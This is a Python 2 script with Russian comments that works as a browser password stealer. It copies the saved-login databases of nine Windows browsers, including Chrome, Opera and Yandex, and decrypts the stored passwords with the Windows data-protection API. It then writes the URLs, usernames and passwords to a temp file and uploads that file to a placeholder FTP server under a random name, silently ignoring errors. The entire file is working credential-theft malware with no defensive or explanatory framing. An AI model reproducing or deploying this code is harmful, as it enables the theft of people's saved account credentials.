#!/usr/bin/env python
# -*- coding: utf-8 -*-
# библиотеки
from os.path import expanduser
from sqlite3 import connect
from ftplib import FTP_TLS
from re import findall
import sys, random
from winstr import *

reload(sys)
sys.setdefaultencoding('utf-8')

def main():	
	pathusr         = expanduser('~')
	vivaldi         = pathusr + '''\AppData\Local\Vivaldi\User Data\Default\Login Data'''
	chrome          = pathusr + '''\AppData\Local\Google\Chrome\User Data\Default\Login Data'''
	yandex          = pathusr + '''\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'''
	opera           = pathusr + '''\AppData\Roaming\Opera Software\Opera Stable\Login Data'''
	kometa          = pathusr + '''\AppData\Local\Kometa\User Data\Default\Login Data'''
	orbitum         = pathusr + '''\AppData\Local\Orbitum\User Data\Default\Login Data'''
	comodo          = pathusr + '''\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'''
	amigo           = pathusr + '''\AppData\Local\Amigo\User\User Data\Default\Login Data'''
	torch           = pathusr + '''\AppData\Local\Torch\User Data\Default\Login Data'''

	databases       = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]

	coped_db        = pathusr + '''\AppData\Logins'''
	file_with_logs  = pathusr + '''\AppData\Local\Temp\Logins.txt'''

	server          = 'FTPSERVER'
	user            = 'FTPUSER'
	pasd            = 'FTPPASS'

	ftp = FTP_TLS()
	ftp.set_debuglevel(0)
	ftp.connect(server, 21)
	ftp.sendcmd('USER ' + str(user))
	ftp.sendcmd('PASS ' + str(pasd))

	for db in databases:
		try:
			source = open(db, 'r')
			source.close()
			source_size = os.stat(db).st_size
			copied = 0
			source = open(db, 'rb')
			target = open(coped_db, 'wb')
			while True:
				chunk = source.read(32768)
				if not chunk:
					break
				target.write(chunk)
				copied += len(chunk)
				
			source.close()
			target.close()

			con = connect(coped_db)
			cursor = con.cursor()

			cursor.execute("SELECT origin_url, username_value, password_value from logins;")
			
			var_with_logs = ''
			for log in cursor.fetchall():
				password = Win32CryptUnprotectData(log[2])
				var_with_logs += str('URL: ' + log[0] + '\n')
				var_with_logs += str('Login : ' + log[1]  + '\n')
				var_with_logs += str('Password : ' + password + '\n\n')

			file = open(file_with_logs, 'w')
			file.writelines(var_with_logs)
			file.close()

			str1 = '123456789'
			str2 = 'qwertyuiopasdfghjklzxcvbnm'
			str3 = str2.upper()
			str4 = str1+str2+str3
			ls = list(str4)
			random.shuffle(ls)
			randomstr = ''.join([random.choice(ls) for x in range(10)])
			
			ftpbase = randomstr + '.txt'
			ftp.storbinary('STOR ' + ftpbase, open(file_with_logs, 'rb'))

		except Exception as e:
			pass

	ftp.close()

if __name__ == '__main__':

	main()
